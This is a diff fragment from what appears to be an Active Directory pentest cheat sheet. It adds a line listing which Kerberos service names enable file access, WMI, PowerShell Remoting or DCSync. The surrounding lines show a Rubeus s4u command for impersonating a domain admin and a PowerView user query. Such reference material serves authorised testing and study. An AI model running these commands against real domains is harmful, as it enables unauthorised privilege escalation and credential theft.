@@ -854,6 +854,7 @@ Get-DomainUser | ? {!($_.memberof -Match "Protected Users")} | select samaccount
 
 #### Impersonate another user (For example DA)
 - Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right
+- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
 ```
 .\Rubeus.exe s4u /user:<USER OR COMPUTER$> /rc4:<HASH> /impersonateuser:<TARGET USER DA> /msdsspn:cifs/<TARGET COMPUTER> /ptt
 
